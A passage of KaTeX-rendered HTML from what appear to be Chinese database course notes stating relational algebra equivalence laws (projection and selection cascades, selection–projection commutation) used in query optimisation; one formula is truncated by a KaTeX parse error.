class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li></ul><p>并，交运算也有结合律</p><h5 id="%E5%AE%9A%E7%90%86l3%EF%BC%9A%E6%8A%95%E5%BD%B1%E4%B8%B2%E6%8E%A5%E7%8E%87" tabindex="-1">定理L3：投影串接率</h5><p a_1,..a_n>设属性集合<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><mo>⊆</mo><mrow><msub><mi>B</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow></mrow><annotation encoding="application/x-tex">{A_1,..A_n}\subseteq {B_1..B_m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>是表达式，则有：<br><section><eqn><span class="katex-error" title="ParseError: KaTeX parse error: Expected group after &#x27;_&#x27; at position 46: …}(E))\equiv \pi_̲" style="color:#cc0000">\pi_{A_1,..A_n}(\pi_{B_1,..B_m}(E))\equiv \pi_</span></eqn></section></p><ul><li>此定理可以双向使用<ul><li>正向可以将两遍扫描变为一边扫描</li><li>逆向可以将属性扩展便于投影操作的移动</li></ul></li></ul><h5 id="%E5%AE%9A%E7%90%86l4%EF%BC%9A%E9%80%89%E6%8B%A9%E7%9A%84%E4%B8%B2%E6%8E%A5%E7%8E%87" tabindex="-1">定理L4：选择的串接率</h5><p>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>是关系代数表达式，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_1,F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是条件，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mrow><mi>F</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F1}(\sigma_{F2}(E))\equiv \sigma_{F_1\wedge F_2}(E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∧</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span></span></eqn></section></p><ul><li>此定理可以双向使用<ul><li>正向可以将两遍扫描变为一边扫描</li><li>逆向可以将属性扩展便于选择操作的移动</li></ul></li></ul><h5 id="%E5%AE%9A%E7%90%86l5%EF%BC%9A%E9%80%89%E6%8B%A9%E5%92%8C%E6%8A%95%E5%BD%B1%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L5：选择和投影的交换律</h5><p>设条件F只涉及属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">{A_1...A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>是关系表达式，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1..A_n}(\sigma_{F}(E))\equiv\sigma_F(\pi_{A_1..A_n}(E))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span></span></span></span></span></eqn></section><br>更一般地，若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>还涉及不属于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">{A1,..A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>的属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">{B_1,..B_m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>,则<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1,...A_n}(\sigma_F(E))\equiv\pi_{A_1,..A_n}(\sigma_F(\pi_{A_1,..A_n,B_1,..B_m}(E)))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">...</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 